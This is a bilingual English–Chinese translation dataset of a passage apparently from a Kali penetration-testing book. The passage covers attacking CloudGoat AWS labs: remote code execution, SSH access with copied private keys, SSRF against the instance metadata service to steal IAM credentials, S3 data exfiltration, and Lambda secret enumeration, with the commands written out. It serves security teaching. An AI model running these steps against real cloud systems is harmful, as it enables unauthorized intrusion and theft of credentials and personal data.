- en: 'Finally, accessing the URL takes us to the form submission, which is vulnerable
    to remote code execution, whereby testers will now be able to run commands on
    the server:'
  id: totrans-111
  prefs: []
  type: TYPE_NORMAL
  zh: 最后，访问该 URL 后将进入表单提交页面，该页面存在远程代码执行漏洞，测试人员现在可以在服务器上运行命令：
- en: '![Graphical user interface, text, application  Description automatically generated](../Images/B17765_08_16.png)'
  id: totrans-112
  prefs: []
  type: TYPE_IMG
  zh: '![图形用户界面、文本、应用程序 描述自动生成](../Images/B17765_08_16.png)'
- en: 'Figure 8.16: Successfully executing the command on the server'
  id: totrans-113
  prefs: []
  type: TYPE_NORMAL
  zh: 图 8.16：成功在服务器上执行命令
- en: 'We have now exploited remote code execution on the web application by leveraging
    the existing permissions to view the instances, load balancer configuration, and
    the files that were accessible from the S3 bucket. Let’s try the other profile
    (`mcduck`) to understand how we can further take over the running EC2 instance
    within the AWS estate. To view instance details testers can run `sudo aws ec2
    describe-instances --profile mcduck --region us-east-1` as shown in *Figure 8.17*:'
  id: totrans-114
  prefs: []
  type: TYPE_NORMAL
  zh: 我们现在通过利用现有权限，查看实例、负载均衡器配置以及可以从 S3 存储桶访问的文件，成功地在 Web 应用程序上进行了远程代码执行。让我们尝试使用另一个配置文件（`mcduck`），了解如何进一步接管
    AWS 环境中的运行中的 EC2 实例。测试人员可以运行`sudo aws ec2 describe-instances --profile mcduck
    --region us-east-1`来查看实例详细信息，如*图 8.17*所示：
- en: '![](../Images/B17765_08_17.png)'
  id: totrans-115
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_08_17.png)'
- en: 'Figure 8.17: Identifying instances using the mcduck profile'
  id: totrans-116
  prefs: []
  type: TYPE_NORMAL
  zh: 图 8.17：使用 mcduck 配置文件识别实例
- en: 'We can see the reservations and instance details with `imageID` and its placement.
    Further within the details, we can find the public IP address and the DNS name
    of the instance along with all the networking and subnet details, as shown in
    *Figure 8.18*:'
  id: totrans-117
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以看到预留和实例的详细信息，包括`imageID`及其位置。在这些详细信息中，我们可以找到实例的公共 IP 地址和 DNS 名称，以及所有的网络和子网信息，如*图
    8.18*所示：
- en: '![](../Images/B17765_08_18.png)'
  id: totrans-118
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_08_18.png)'
- en: 'Figure 8.18: Identifying the public IP and public DNS of the instance'
  id: totrans-119
  prefs: []
  type: TYPE_NORMAL
  zh: 图 8.18：识别实例的公共 IP 和公共 DNS
- en: 'Attackers with the public IP can now explore any kind of key information that
    might be available within the S3 buckets. To view what S3 buckets are accessible,
    run `sudo aws s3 ls ––profile ––region us-east-1`, and then copy the folder type
    `sudo aws s3 cp s3://bucket/folder/ ./keys ––profile mcduck ––region us-east-1`
    as shown in *Figure 8.19*:'
  id: totrans-120
  prefs: []
  type: TYPE_NORMAL
  zh: 拥有公共 IP 的攻击者现在可以探索可能存在于 S3 存储桶中的任何密钥信息。要查看可访问的 S3 存储桶，请运行`sudo aws s3 ls ––profile
    ––region us-east-1`，然后复制文件夹类型`sudo aws s3 cp s3://bucket/folder/ ./keys ––profile
    mcduck ––region us-east-1`，如*图 8.19*所示：
- en: '[PRE10]'
  id: totrans-121
  prefs: []
  type: TYPE_PRE
  zh: '[PRE10]'
- en: '![Text  Description automatically generated](../Images/B17765_08_19.png)'
  id: totrans-122
  prefs: []
  type: TYPE_IMG
  zh: '![Text  Description automatically generated](../Images/B17765_08_19.png)'
- en: 'Figure 8.19: Accessing the S3 profiles using the mcduck profile'
  id: totrans-123
  prefs: []
  type: TYPE_NORMAL
  zh: 图 8.19：使用 mcduck 配置文件访问 S3 配置文件
- en: 'Now, this profile only has access to the keystore and we have copied the public
    and private key to our local Kali Linux. The next step is to change the file permission
    of the private key by running `sudo chmod 400 cloudgoat`, and then secure shell
    the login to the EC2 instance directly by running `ssh –i cloudgoat ubuntu@PublicIP`,
    as shown in *Figure 8.20*:'
  id: totrans-124
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，此配置文件仅能访问密钥库，我们已经将公钥和私钥复制到本地的 Kali Linux 中。下一步是通过运行`sudo chmod 400 cloudgoat`来更改私钥的文件权限，然后通过运行`ssh
    –i cloudgoat ubuntu@PublicIP`直接使用安全外壳登录 EC2 实例，如*图 8.20*所示：
- en: '[PRE11]'
  id: totrans-125
  prefs: []
  type: TYPE_PRE
  zh: '[PRE11]'
- en: '![](../Images/B17765_08_20.png)'
  id: totrans-126
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_08_20.png)'
- en: 'Figure 8.20: Logging in to the AWS instance from the acquired private key'
  id: totrans-127
  prefs: []
  type: TYPE_NORMAL
  zh: 图 8.20：从获得的私钥登录 AWS 实例
- en: 'Now that we can gain internal access to the Ubuntu EC2 instance, access the
    metadata service by directly accessing `http://169.254.169.254/latest/user-data`
    within the terminal of the remote system:'
  id: totrans-128
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，我们可以获得 Ubuntu EC2 实例的内部访问权限，通过在远程系统的终端中直接访问`http://169.254.169.254/latest/user-data`来访问元数据服务：
- en: '[PRE12]'
  id: totrans-129
  prefs: []
  type: TYPE_PRE
  zh: '[PRE12]'
- en: '![](../Images/B17765_08_21.png)'
  id: totrans-130
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_08_21.png)'
- en: 'Figure 8.21: Accessing the metadata service within the EC2 instance'
  id: totrans-131
  prefs: []
  type: TYPE_NORMAL
  zh: 图 8.21：访问 EC2 实例中的元数据服务
- en: 'Attempt to log in to `postgresql` with the username and password to identify
    the secret password:'
  id: totrans-132
  prefs: []
  type: TYPE_NORMAL
  zh: 尝试使用用户名和密码登录`postgresql`以识别秘密密码：
- en: '[PRE13]'
  id: totrans-133
  prefs: []
  type: TYPE_PRE
  zh: '[PRE13]'
- en: '![](../Images/B17765_08_22.png)'
  id: totrans-134
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_08_22.png)'
- en: 'Figure 8.22: Successfully connecting to the database and accessing the plain
    text password within the database'
  id: totrans-135
  prefs: []
  type: TYPE_NORMAL
  zh: 图 8.22：成功连接到数据库并访问数据库中的明文密码
- en: 'Within the EC2 instance, we can now check what S3 buckets are accessible. Before
    you can access the buckets, ensure Ubuntu is installed with `awscli` by running
    `sudo apt-get install awscli` in the terminal and then run the following commands
    to view the end goal as shown in *Figure 8.23*:'
  id: totrans-136
  prefs: []
  type: TYPE_NORMAL
  zh: 在 EC2 实例中，我们现在可以检查哪些 S3 存储桶是可访问的。在访问存储桶之前，确保 Ubuntu 已安装`awscli`，可以通过在终端中运行`sudo
    apt-get install awscli`来安装，然后运行以下命令以查看最终目标，如*图 8.23*所示：
- en: '[PRE14]'
  id: totrans-137
  prefs: []
  type: TYPE_PRE
  zh: '[PRE14]'
- en: '![Text  Description automatically generated](../Images/B17765_08_23.png)'
  id: totrans-138
  prefs: []
  type: TYPE_IMG
  zh: '![Text  Description automatically generated](../Images/B17765_08_23.png)'
- en: 'Figure 8.23: Exfiltrating the database details from the S3 bucket'
  id: totrans-139
  prefs: []
  type: TYPE_NORMAL
  zh: 图 8.23：从 S3 存储桶中提取数据库详细信息
- en: 'A final important step is to destroy the setup by returning to the CloudGoat
    Docker image and running `./cloudgoat.py destroy all`. You should get a confirmation
    as shown in *Figure 8.24*:'
  id: totrans-140
  prefs: []
  type: TYPE_NORMAL
  zh: 最后一个重要步骤是通过返回到CloudGoat Docker镜像并运行`./cloudgoat.py destroy all`来销毁设置。你应该会看到确认信息，如*图8.24*所示：
- en: '![Text  Description automatically generated](../Images/B17765_08_24.png)'
  id: totrans-141
  prefs: []
  type: TYPE_IMG
  zh: '![文本 描述自动生成](../Images/B17765_08_24.png)'
- en: 'Figure 8.24: Destroying the rce_web_app cloud setup using CloudGoat'
  id: totrans-142
  prefs: []
  type: TYPE_NORMAL
  zh: 图8.24：使用CloudGoat销毁rce_web_app云设置
- en: We have explored the security misconfiguration and vulnerable web applications
    within the AWS setup. We will now explore the different methodologies that can
    be leveraged to exploit S3 buckets in the coming section.
  id: totrans-143
  prefs: []
  type: TYPE_NORMAL
  zh: 我们已经探讨了AWS设置中的安全配置错误和易受攻击的Web应用程序。接下来，我们将探讨可以利用的不同方法，以便在下一节中利用S3桶。
- en: Testing for S3 bucket misconfiguration
  id: totrans-144
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 测试S3桶的配置错误
- en: S3 is typically used by organizations to store documents, code, file uploads,
    and so on and so forth. Typically, a bucket can be either public or private. When
    public, all users can list the contents, and when private, only the selected set
    of users can list the contents. Although S3 exploitation has always been in the
    news, notably for developers storing mission-critical information in a bucket
    marked as “public.” In this section, we will explore identifying S3 buckets and
    exploiting misconfiguration to gain access to the internal AWS infrastructure.
  id: totrans-145
  prefs: []
  type: TYPE_NORMAL
  zh: S3通常被组织用来存储文档、代码、文件上传等内容。通常，桶可以是公开的或私有的。公开时，所有用户都可以列出其中的内容；私有时，只有特定的用户可以列出其中的内容。尽管S3的漏洞一直是新闻关注的焦点，尤其是开发人员将关键任务信息存储在标记为“公开”的桶中。在本节中，我们将探讨如何识别S3桶以及利用配置错误来获取对内部AWS基础设施的访问权限。
- en: 'To practice S3 bucket misconfiguration, we will be setting up a vulnerable
    S3 instance using CloudGoat by running the following command within the CloudGoat
    Docker image:'
  id: totrans-146
  prefs: []
  type: TYPE_NORMAL
  zh: 为了练习S3桶配置错误，我们将通过在CloudGoat Docker镜像中运行以下命令来设置一个易受攻击的S3实例：
- en: '[PRE15]'
  id: totrans-147
  prefs: []
  type: TYPE_PRE
  zh: '[PRE15]'
- en: 'Once the setup is complete, testers should be able to see the following message
    from the deployment tool with the AWS account ID and the target IP address, as
    shown in *Figure 8.25*:'
  id: totrans-148
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦设置完成，测试人员应该能够从部署工具中看到包含AWS账户ID和目标IP地址的以下信息，如*图8.25*所示：
- en: '![](../Images/B17765_08_25.png)'
  id: totrans-149
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_08_25.png)'
- en: 'Figure 8.25: Successful creation of the cloud_breach_s3 AWS environment using
    CloudGoat'
  id: totrans-150
  prefs: []
  type: TYPE_NORMAL
  zh: 图8.25：使用CloudGoat成功创建cloud_breach_s3 AWS环境
- en: 'Identifying what is running on the external IP, attackers can choose to run
    a port scan on the IP. In this case, port `80` is open and accessible:'
  id: totrans-151
  prefs: []
  type: TYPE_NORMAL
  zh: 识别外部IP上运行的内容后，攻击者可以选择对该IP进行端口扫描。在这种情况下，端口`80`是开放并可访问的：
- en: Access the IP using the curl utility by running `curl http://<IP Address>`.
    You will receive an error message regarding the EC2 metadata service, as shown
    in *Figure 8.26*:![](../Images/B17765_08_26.png)
  id: totrans-152
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 使用`curl http://<IP 地址>`命令访问IP地址。你将收到一个关于EC2元数据服务的错误信息，如*图8.26*所示：![](../Images/B17765_08_26.png)
- en: 'Figure 8.26: Accessing the public IP address'
  id: totrans-153
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图8.26：访问公共IP地址
- en: Cloud providers certainly do have the ability to manage credentials for resources
    in any cloud consumers’ cloud-native applications. If this is done correctly,
    then the storage of credentials in clear text or in a source code repository can
    be avoided. In AWS, the **instance metadata service** (**IMDS**) provides the
    data about a given instance that you can use to configure or manage the running
    instances. AWS uses the `169.254.169.254` IP address to return the hosted metadata
    service. So, we will be adding the host header to retrieve the contents from the
    target IP by running `curl http://<IPAddress> -H 'Host:169.254.169.254'`, which
    should return the contents of the root folder of the website as seen in *Figure
    8.27*. Attackers can choose to use Burp Suite to intercept the traffic and add
    a host header to the request and browse the folders and directories.![](../Images/B17765_08_27.png)
  id: totrans-154
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 云服务提供商确实有能力管理云消费者云原生应用程序中资源的凭证。如果正确执行，那么就可以避免将凭证存储为明文或在源代码库中存储。在AWS中，**实例元数据服务**（**IMDS**）提供有关给定实例的数据，可用于配置或管理正在运行的实例。AWS使用`169.254.169.254`
    IP地址返回托管的元数据服务。因此，我们将添加主机头，通过运行`curl http://<IP 地址> -H 'Host:169.254.169.254'`来检索目标IP的内容，这将返回网站根目录的内容，如*图8.27*所示。攻击者可以选择使用Burp
    Suite拦截流量，并向请求中添加主机头，浏览文件夹和目录。![](../Images/B17765_08_27.png)
- en: 'Figure 8.27: Successfully accessing the IP with the metadata service'
  id: totrans-155
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图8.27：成功访问带有元数据服务的IP
- en: After browsing through the directories, we make a request to the `/latest/meta-data/iam/security-credentials/cg-bank-WAF-Role-cg<ID>`
    file that returns the `AccessKeyID`, `secretAccessKey`, and session token as shown
    in *Figure 8.28*. The session token indicates that the credentials are time-based.
    However, if the testers encounter IMDS v2, it will then require an additional
    token to retrieve the credentials:![](../Images/B17765_08_28.png)
  id: totrans-156
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 浏览完目录后，我们请求 `/latest/meta-data/iam/security-credentials/cg-bank-WAF-Role-cg<ID>`
    文件，该文件返回 `AccessKeyID`、`secretAccessKey` 和会话令牌，如 *图 8.28* 所示。会话令牌表明凭证是基于时间的。然而，如果测试者遇到
    IMDS v2，则需要额外的令牌来获取凭证：![](../Images/B17765_08_28.png)
- en: 'Figure 8.28: Successfully generating the credentials using the AWS metadata
    service'
  id: totrans-157
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 8.28：成功生成凭证，使用 AWS 元数据服务
- en: 'The next step is to equip our Kali Linux with the AWS profile from the above
    information, as shown in *Figure 8.29*:'
  id: totrans-158
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 下一步是根据上述信息为我们的 Kali Linux 配置 AWS 配置文件，如 *图 8.29* 所示：
- en: '[PRE16]'
  id: totrans-159
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE16]'
- en: '![](../Images/B17765_08_29.png)'
  id: totrans-160
  prefs:
  - PREF_IND
  type: TYPE_IMG
  zh: '![](../Images/B17765_08_29.png)'
- en: 'Figure 8.29: Creating a new profile within Kali Linux for the S3 exploit'
  id: totrans-161
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 8.29：在 Kali Linux 中为 S3 漏洞创建新配置文件
- en: 'Once the profile is configured, we will go ahead and add our session token
    by editing the AWS credential file. The default location of this file is `~/.aws/credentials`.
    In our case, we have run all the `aws` commands using `sudo`, hence all the credentials
    and other details will be stored under the root user. We will be editing the file
    located in /`root/.aws/credentials` by using our favorite editor:'
  id: totrans-162
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 配置好配置文件后，我们将继续通过编辑 AWS 凭证文件来添加会话令牌。该文件的默认位置是 `~/.aws/credentials`。在我们的案例中，我们通过
    `sudo` 运行所有 `aws` 命令，因此所有凭证和其他详细信息将存储在 root 用户下。我们将使用最喜欢的编辑器编辑位于 `/root/.aws/credentials`
    的文件：
- en: '[PRE17]'
  id: totrans-163
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE17]'
- en: 'Add the `aws_session_token` obtained in *step 3*, as shown in *Figure 8.30*:'
  id: totrans-164
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如 *图 8.30* 所示，添加在 *步骤 3* 中获得的 `aws_session_token`：
- en: '![](../Images/B17765_08_30.png)'
  id: totrans-165
  prefs:
  - PREF_IND
  type: TYPE_IMG
  zh: '![](../Images/B17765_08_30.png)'
- en: 'Figure 8.30: Adding aws_session_token to the credential file'
  id: totrans-166
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 8.30：将 aws_session_token 添加到凭证文件中
- en: 'Now, the next step is to check if we are able to access the S3 buckets by running
    the following command in the terminal:'
  id: totrans-167
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在，下一步是通过在终端运行以下命令来检查我们是否能够访问 S3 桶：
- en: '[PRE18]'
  id: totrans-168
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE18]'
- en: 'From the previous step, we can now download the contents of the S3 bucket to
    our local host by running the command shown in *Figure 8.31*:'
  id: totrans-169
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 从上一步骤开始，我们现在可以通过运行 *图 8.31* 中显示的命令，将 S3 桶的内容下载到本地主机：
- en: '[PRE19]'
  id: totrans-170
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE19]'
- en: '![](../Images/B17765_08_31.png)'
  id: totrans-171
  prefs:
  - PREF_IND
  type: TYPE_IMG
  zh: '![](../Images/B17765_08_31.png)'
- en: 'Figure 8.31: Copying the S3 bucket contents to the local system'
  id: totrans-172
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 8.31：将 S3 桶内容复制到本地系统
- en: We have now exploited the misconfigured S3 bucket and exfiltrated the data from
    the target organization. You should now be able to view the cardholder data with
    all the **personally identifiable information** (**PII**) as shown in *Figure
    8.32*:![](../Images/B17765_08_32.png)
  id: totrans-173
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们现在已经利用配置错误的 S3 桶，成功从目标组织外泄数据。你现在应该能够查看包含所有 **个人身份信息** (**PII**) 的持卡人数据，如 *图
    8.32* 所示：![](../Images/B17765_08_32.png)
- en: 'Figure 8.32: Contents of the copied data that includes personally identifiable
    information'
  id: totrans-174
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 8.32：复制的数据内容，包括个人身份信息
- en: 'The final step is to go back to the CloudGoat Docker image and ensure that
    we destroy the instance created to avoid any accidental exposure to real attackers
    or billing charges from Amazon by running the following command within the Docker
    image:'
  id: totrans-175
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 最后一步是回到 CloudGoat Docker 镜像，确保销毁已创建的实例，以避免任何意外的暴露给真实攻击者或来自 Amazon 的账单费用，通过在
    Docker 镜像内运行以下命令：
- en: '[PRE20]'
  id: totrans-176
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE20]'
- en: Understanding misconfiguration in S3 could lead to data exfiltration. How about
    if there is a misconfiguration in the permissions that are set for users? We will
    explore that in the next section.
  id: totrans-177
  prefs: []
  type: TYPE_NORMAL
  zh: 理解 S3 中的配置错误可能导致数据外泄。如果用户权限配置错误会怎样？我们将在下一部分探讨这一问题。
- en: Exploiting security permission flaws
  id: totrans-178
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 利用安全权限缺陷
- en: 'The following are the most common vulnerabilities within AWS cloud services:'
  id: totrans-179
  prefs: []
  type: TYPE_NORMAL
  zh: 以下是 AWS 云服务中最常见的漏洞：
- en: '**Excessive public subnets** – The majority of organizations utilize the default
    **VPC** (**Virtual Private Cloud**) feature that is built into AWS and make few
    changes when they utilize AWS services, taking the easy approach. However, this
    approach has been proven dangerous in many cases (an example would be botnet-based
    crypto-ransomware). Public subnets are accessible by anyone on the internet, potentially
    exposing something that shouldn’t normally be available.'
  id: totrans-180
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**过多的公共子网** – 大多数组织使用 AWS 中内置的默认 **VPC**（**虚拟私有云**）功能，在使用 AWS 服务时很少进行更改，采用的是一种简便的方法。然而，这种方法在许多案例中已经证明是危险的（一个例子是基于僵尸网络的加密勒索软件）。公共子网对互联网上的任何人开放，可能会暴露一些本不应公开的信息。'
- en: '**IAM** (**Identity and Access Management**) issues in organizations that do
    not utilize two- or multi-factor authentication for high-privileged accounts and
    utilize a single account for almost everything, providing the same level of access
    to all new accounts, putting them at risk. There have been cases where employees’
    accounts have been compromised through email phishing leading to massive ransomware
    attacks that cost the organization almost the same amount of money it would take
    to rebuild the entire company.'
  id: totrans-181
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**IAM**（**身份和访问管理**）问题，出现在那些未为高权限账户启用双因素或多因素认证，并且几乎所有事务都使用同一个账户的组织中，这种做法使得所有新账户具有相同的访问权限，从而使其面临风险。曾经发生过员工账户通过电子邮件钓鱼攻击被入侵，导致了大规模的勒索软件攻击，给组织带来的损失几乎相当于重建整个公司的费用。'
- en: '**Misconfigured S3 buckets** – In the previous section, we explored S3 bucket
    permission misconfiguration. This is one of the most common themes noted during
    cloud penetration testing. Although buckets are private by default, sometimes
    IT operations/development teams or the third parties who manage these types of
    infrastructure tend to make them public. That opens them up to the inevitable
    threat of adversaries, finding misconfigured S3 buckets with sensitive information
    such as private keys or unattended files, including backups or log files.'
  id: totrans-182
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**配置错误的 S3 桶** – 在前一节中，我们探讨了 S3 桶权限配置错误的问题。这是云渗透测试中最常见的主题之一。尽管桶默认是私有的，但有时 IT
    操作/开发团队或管理这些基础设施的第三方会将其设置为公开。这就使得桶面临不可避免的威胁，攻击者可能会发现配置错误的 S3 桶，获取其中的敏感信息，如私钥或无人管理的文件，包括备份或日志文件。'
- en: '**Origin servers** – The majority of the cloud service providers utilize a
    **Content Delivery Network** (**CDN**) to distribute content to high-volume customers.
    Most of the time, these are misconfigured, leaking the origin of the servers.
    One of our pentesters gave an example of how this can lead to a security breach.
    During penetration testing, it is not uncommon to find the origin servers and
    directly hit their vulnerabilities and even take over the database with brute-force-style
    attacks.'
  id: totrans-183
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**源服务器** – 大多数云服务提供商利用 **内容分发网络**（**CDN**）将内容分发给高流量客户。大多数情况下，这些配置错误，泄露了源服务器的地址。我们的一位渗透测试人员举了一个例子，说明这种泄漏如何导致安全漏洞。在渗透测试中，发现源服务器并直接攻击其漏洞，甚至通过暴力破解风格的攻击接管数据库并不罕见。'
- en: '**SSRF** (**Server Side Request Forgery**) – This is an attack that can be
    abused to take advantage of legitimate AWS functionality and gain access to metadata
    information, and if exploited successfully attackers can retrieve valid user credentials
    for an IAM role. We will explore this attack in this section.'
  id: totrans-184
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**SSRF**（**服务器端请求伪造**）– 这是一种攻击手段，可以利用合法的 AWS 功能来获取元数据，并且如果成功利用，攻击者可以检索到有效的
    IAM 角色用户凭证。在本节中，我们将探讨这种攻击。'
- en: '**DNS records** – Most of the time, during the initial reconnaissance, attackers
    can easily identify the S3 bucket details with the subdomain of the organization.
    The issue arises when the operations team forgets to update their DNS records
    in a timely fashion, or even, surprisingly, decommissions unattended S3 buckets
    still live and available to anyone on the public internet.'
  id: totrans-185
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**DNS 记录** – 在初步侦察阶段，攻击者通常可以通过组织的子域名轻松识别出 S3 桶的详细信息。问题出现在操作团队未能及时更新 DNS 记录，或者令人惊讶的是，甚至会退役一些无人管理的
    S3 桶，而这些桶仍然处于开放状态，任何人都可以通过互联网访问。'
- en: 'With all the information above, we will now set up CloudGoat to create a vulnerable
    AWS deployment where we will exploit legitimate AWS functionality by performing
    an SSRF attack. The following are the step-by-step instructions to perform this
    attack:'
  id: totrans-186
  prefs: []
  type: TYPE_NORMAL
  zh: 综合以上信息，我们将设置 CloudGoat，创建一个有漏洞的 AWS 部署环境，在这里我们将通过执行 SSRF 攻击来利用 AWS 的合法功能。以下是执行此攻击的逐步说明：
- en: Deploy the vulnerable AWS setup by returning to the CloudGoat Docker image and
    run `./cloudgoat.py create ec2_ssrf --profile masteringkali` in the terminal,
    and that should set up the infrastructure and provide us with the following confirmation,
    which includes an access ID and secret key:![](../Images/B17765_08_33.png)
  id: totrans-187
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 通过返回CloudGoat Docker镜像并在终端运行`./cloudgoat.py create ec2_ssrf --profile masteringkali`来部署易受攻击的AWS设置，这将设置基础设施并提供以下确认，包括访问ID和密钥对：![](../Images/B17765_08_33.png)
- en: 'Figure 8.33: Creating the ec2_ssfr AWS environment using CloudGoat'
  id: totrans-188
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 8.33：使用CloudGoat创建ec2_ssfr AWS环境
- en: Create an AWS profile within Kali Linux by running `sudo aws configure ––profile
    ssrf` as shown in *Figure 8.34*, and enter the `Access Key ID` and `Secret Access
    Key`:![](../Images/B17765_08_34.png)
  id: totrans-189
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在Kali Linux中创建AWS配置文件，通过运行`sudo aws configure ––profile ssrf`，如*图 8.34*所示，并输入`Access
    Key ID`和`Secret Access Key`：![](../Images/B17765_08_34.png)
- en: 'Figure 8.34: Configuring the AWS profile within Kali Linux'
  id: totrans-190
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 8.34：在Kali Linux中配置AWS配置文件
- en: We can enumerate the access privileges of the access key by running the `enumerate-iam`
    tool, which can be directly cloned from Git by running `sudo git clone https://github.com/andresriancho/enumerate-iam`
    and then `cd enumerate-iam`. We can install the required packages by running `sudo
    pip3 install –r requirements.txt`. Once it is done, we can run the enumerate tool
    by entering `sudo python3 enumerate-iam.py ––access-key xx ––secret-key xx` as
    shown in *Figure 8.35*. This will provide details such as the associated user,
    account ID, and other lists of services.![Text  Description automatically generated](../Images/B17765_08_35.png)
  id: totrans-191
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们可以通过运行`enumerate-iam`工具来列举访问密钥的权限，首先通过`sudo git clone https://github.com/andresriancho/enumerate-iam`从Git直接克隆，然后运行`cd
    enumerate-iam`。接着，通过运行`sudo pip3 install –r requirements.txt`来安装所需的包。一旦完成，我们可以通过输入`sudo
    python3 enumerate-iam.py ––access-key xx ––secret-key xx`来运行enumerate工具，如*图 8.35*所示。这将提供如关联用户、账户ID以及其他服务列表等详细信息。![Text  Description
    automatically generated](../Images/B17765_08_35.png)
- en: 'Figure 8.35: Enumerating the AWS account with the access and secret keys using
    enumerate-iam.py'
  id: totrans-192
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 8.35：使用enumerate-iam.py列举AWS账户的访问和密钥对
- en: Let’s explore the lambda functions that this ID can access by running `sudo
    aws lambda list-functions ––profile ssrf ––region us-east-1`, which should provide
    us with a list of accessible lambda functions, as shown in *Figure 8.36*:![](../Images/B17765_08_36.png)
  id: totrans-193
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 让我们通过运行`sudo aws lambda list-functions ––profile ssrf ––region us-east-1`来探索该ID可以访问的lambda函数，这将为我们提供一个可访问的lambda函数列表，如*图
    8.36*所示：![](../Images/B17765_08_36.png)
- en: 'Figure 8.36: List of functions in AWS Lambda that is available to the profile'
  id: totrans-194
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 8.36：AWS Lambda中可用的函数列表，该列表对该配置文件可用
- en: 'Users might get an error message when running the above command: `An error
    occurred (InvalidSignatureException) when calling the ListFunctions operation:
    Signature expired`. This is due to time issues. It is recommended that testers
    run `sudo apt install ntpupdate` `and sudo ntpdate pool.ntp.org` in the terminal.'
  id: totrans-195
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '用户在运行上述命令时可能会遇到错误信息：`An error occurred (InvalidSignatureException) when calling
    the ListFunctions operation: Signature expired`。这是由于时间问题。建议测试人员在终端运行`sudo apt
    install ntpupdate`和`sudo ntpdate pool.ntp.org`。'
- en: Lambda is exposing an access key and secret key. Let’s get more information
    about the specific function by running `sudo aws lambda get-function –function-name
    cg-lambda-cg<randomid> --profile ssrf –region us-east-1` in the terminal. That
    should return more verbose information about this lambda function:![](../Images/B17765_08_37.png)
  id: totrans-196
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: Lambda正在暴露访问密钥和密钥对。让我们通过在终端运行`sudo aws lambda get-function –function-name cg-lambda-cg<randomid>
    --profile ssrf –region us-east-1`来获取有关特定函数的更多信息。这样应该会返回有关此lambda函数的更详细信息：![](../Images/B17765_08_37.png)
- en: 'Figure 8.37: Full details of the specific lambda function with AWS'
  id: totrans-197
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 8.37：AWS中特定lambda函数的完整详细信息
- en: We will now configure our Kali Linux with the keys that we got from the lambda
    functions and call this `lambda-solus` as shown in *Figure 8.38*:![](../Images/B17765_08_38.png)
  id: totrans-198
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们现在将使用从lambda函数获得的密钥配置我们的Kali Linux，并将其命名为`lambda-solus`，如*图 8.38*所示：![](../Images/B17765_08_38.png)
- en: 'Figure 8.38: Configuring the AWS profile within AWS for the new access key
    from the lambda functions'
  id: totrans-199
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 8.38：在AWS中配置AWS配置文件，用于从lambda函数中获取的新访问密钥
- en: Let’s explore the instances that are available for this profile by running `sudo
    aws ec2 describe-instances –region us-east-1 –profile lambda-solus`. That should
    list the instance details along with the public IP address as shown in *Figure
    8.39*:![](../Images/B17765_08_39.png)
  id: totrans-200
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 通过运行`sudo aws ec2 describe-instances –region us-east-1 –profile lambda-solus`，让我们来查看该配置文件可用的实例。这样应该会列出实例的详细信息以及公共
    IP 地址，如*图 8.39*所示：![](../Images/B17765_08_39.png)
- en: 'Figure 8.39: Accessing the cloud instance details through the lambda-solus
    profile'
  id: totrans-201
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 8.39：通过 lambda-solus 配置文件访问云实例详情
- en: Once we have the public IP address, we can access the instance on port `80`,
    and you should be able to see the error message on the server seen in *Figure
    8.40*:![](../Images/B17765_08_40.png)
  id: totrans-202
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
